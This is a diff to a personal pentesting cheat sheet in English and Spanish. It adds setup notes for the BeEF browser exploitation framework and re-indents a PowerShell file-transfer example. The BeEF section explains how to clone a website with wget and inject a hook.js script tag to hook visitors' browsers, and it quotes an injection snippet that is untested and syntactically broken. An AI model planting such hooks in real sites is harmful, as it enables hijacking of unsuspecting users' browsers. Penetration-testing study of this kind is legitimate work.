@@ -632,13 +632,76 @@ or on machines provided by hackthebox. They are designed to be fun to hack while
         # Vulnerability analysis web apps
         
             # Beef
+
+                There are sometimes that the only way to conduct a pentesting is through the website, so Beef could help you.
             
-                TODO!!!!
-                
                 https://beefproject.com
                 
-                https://www.youtube.com/watch?v=3ogyS4KOlXc&t=637s
+                https://github.com/beefproject/beef
 
+                Cómo funciona?
+
+                    https://www.youtube.com/watch?v=3ogyS4KOlXc
+
+                BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.
+
+                Amid growing concerns about web-borne attacks against clients, including mobile clients, BeEF allows the professional penetration tester to assess the actual security posture of a target environment by using client-side attack vectors. Unlike other security frameworks, BeEF looks past the hardened network perimeter and client system, and examines exploitability within the context of the one open door: the web browser. BeEF will hook one or more web browsers and use them as beachheads for launching directed command modules and further attacks against the system from within the browser context.
+
+                It is installed by default in kali, but in the time of writing, beef was broken, probably due to a broken gem dependency, so i had to create
+                a docker container from scratch, modify a bit config.yaml file and run it using docker.
+                Probably, the best way to run this is through a cloud server, like Linode or whatever with already preinstalled...
+
+                # Docker way
+                # Download the Source Code
+
+                    git clone https://github.com/beefproject/beef  
+                
+                # Setting Your Credentials
+
+                    It is essential that you set your credentials BEFORE building your Docker image. BeEF by default has it's credentials set to beef:beef, but does not allow authentication with default credentials. Consequently if you build an image without changing the credentials you will not be able to authenticate your container's BeEF instance.
+
+                    With your preferred text editor open the config.yaml file found in the BeEF root folder:
+
+                      ...SNIP...
+                        credentials:
+                          user: '<YOUR_USERNAME>'
+                          passwd: '<YOUR_PASSWORD>'
+                      ...SNIP...
+                
+                # Building Your Image & Container
+                
+                    To build your image:
+
+                    docker build -t beef .
+                
+                # To run your container, If you'd prefer the container to run backgrounded/detached just add the -d tag to the command below
+                  
+                    docker run -p 3000:3000 -p 6789:6789 -p 61985:61985 -p 61986:61986 -d --name beef beef
+
+                # Optional, you can run beef behind a NAT with ngrok, but i truly recommend you to run it in a cloud server.
+
+                # Finally, to run Beef in a real scenario, you should not use the default webpage provided by the framework, 
+                you should create your own website or even better, clone it using wget 
+                 and finally you only have to add this html tag bellow <head> tag :
+
+                    <script src="htts://beef.local:3000/hook.js"></script>
+
+                or 
+
+                    Need to be tested!
+
+                    https://hackingvision.com/2018/12/15/cloning-websites-beef-xss/
+
+                <script>
+                var commandModuleStr = ‘<script src”‘ + window.location.protocol 
+                                                      + ‘//‘ + windows.location.host 
+                                                      + ‘<%= @hook_uri %>” type=“text/javascript”><\/script>’;
+                document.write(commandModuleStr);
+                </script>
+
+                # You can integrate metasploit with beef. Probably you will want to do it:
+
+                    https://www.youtube.com/watch?v=4t4kBkMsDbQ
             # Nessus
 
                 https://kali:8834/#/scans/folders/my-scans
@@ -1400,16 +1463,17 @@ or on machines provided by hackthebox. They are designed to be fun to hack while
 
             Abre powershell y escribe, (tienes que tener abierto el puerto 8080 en el firewall de linux y probablemente desactivar Defender en Windows):
 
-            PS C:\Users\IEUser> Invoke-Webrequest -uri http://192.168.85.139:8080/CheatsheetHacking.md -outfile CheatSheetHacking.md
-            PS C:\Users\IEUser> dir .\CheatSheetHacking.md
+                PS C:\Users\IEUser> Invoke-Webrequest -uri http://192.168.85.139:8080/CheatsheetHacking.md -outfile CheatSheetHacking.md
+                PS C:\Users\IEUser> dir .\CheatSheetHacking.md
 
 
-            Directorio: C:\Users\IEUser
+                Directorio: C:\Users\IEUser
 
 
-            Mode                LastWriteTime         Length Name
-            ----                -------------         ------ ----
-            -a----       09/09/2022      3:59         271012 CheatSheetHacking.md
+                Mode                LastWriteTime         Length Name
+                ----                -------------         ------ ----
+                -a----       09/09/2022      3:59         271012 CheatSheetHacking.md
+                
             Comando para recibir el fichero en Linux:
 
                 wget http://192.168.20.X:8080/FiletoTransfer
